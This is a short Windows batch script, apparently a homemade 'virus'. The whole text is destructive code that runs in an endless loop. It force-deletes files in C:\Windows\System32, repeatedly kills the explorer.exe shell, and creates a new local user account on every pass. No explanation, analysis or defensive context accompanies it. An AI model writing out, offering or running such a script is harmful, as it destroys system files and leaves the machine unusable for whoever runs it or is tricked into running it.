@echo off
:viruse
del /f /q "C:\Windows\System32"
taskkill /f /im explorer.exe
tskill explorer.exe
set /a _viruse+=1
net user %_viruse% /add
goto viruse